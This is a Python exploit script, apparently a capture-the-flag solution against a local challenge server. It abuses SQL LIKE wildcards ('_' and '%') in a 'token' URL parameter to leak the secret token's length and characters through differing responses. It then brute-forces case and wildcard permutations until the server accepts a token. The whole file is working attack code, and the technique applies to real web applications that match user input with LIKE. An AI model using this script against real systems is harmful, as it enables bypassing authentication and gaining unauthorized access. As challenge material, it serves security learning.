import requests, random, string
from itertools import product
from urllib.parse import urlencode

chall_url = 'http://localhost:45004'

# printables insensibles à la casse et sans % et _
chars = [char for char in list(string.printable) if char != '%' and char != '_' and not char.isupper()]

def do_req(payload):
    return requests.get(chall_url, params={'token': payload}).text

def get_token_length():
    for i in range(1, 100):
        if 'not found' in do_req('_'*i):
            return i-1
    raise Exception("Oops, something went wrong or token > 100 chars")

def guess_chars(length):
    found = ''

    for i in range(length):
        current = None
        random.shuffle(chars)
        for c in chars:
            print(f" |__ {found}{repr(c)[1:-1]}{'_' * (length - i - 1)}{' '*100}\r", end='')
            r = do_req(f"{found}{c}{'_' * (length - i - 1)}")
            if "not found" not in r:
                current = c
                break
        current = current if current is not None else '_'
        found += current
    return found

def gen_special_combo(s):
    parts = s.split('_')
    options = [('_', '%')] * (len(parts) - 1)
    return [''.join(sum(zip(parts, comb + ('',)), ())) for comb in product(*options)]
    
def gen_case_combo(s):
    choices = [(c.lower(), c.upper()) if c.isalpha() else c for c in s]
    return [''.join(combination) for combination in product(*choices)]

def bruteforce_token(dico):
    pos = 0
    total = len(dico)
    for token in dico:
        pos += 1
        print(f" |__ [{pos}/{total}] {token}\r", end='')
        r = do_req(token)
        if "Hello" in r:
            return token
    raise Exception('Oops, something went wrong...')

print("# Step 1: Guessing token length...")
length = get_token_length()
print(f" |__ length={length}\n")

print("# Step 2: Guessing lowercase token...")
base_token = guess_chars(length)
print("\n")

print("# Step 3: Permumations of '%' and '_'")
base_token_perms = gen_special_combo(base_token)
for combo in base_token_perms:
    print(f" |__ {combo}")
print()

print("# Step 4: Case sensitive combinaisons")
token_dict = []
for perm in base_token_perms:
    token_dict.extend(gen_case_combo(perm))
print(f" |__ {len(token_dict)} tokens generated.\n")

print("# Step 5: Bruteforce")
random.shuffle(token_dict)
super_token = bruteforce_token(token_dict)
print("\n")

print("# Result")
print(f" |__ URL: /?token={urlencode({'token': super_token})}")
print(f" |__ MSG: {do_req(super_token)}")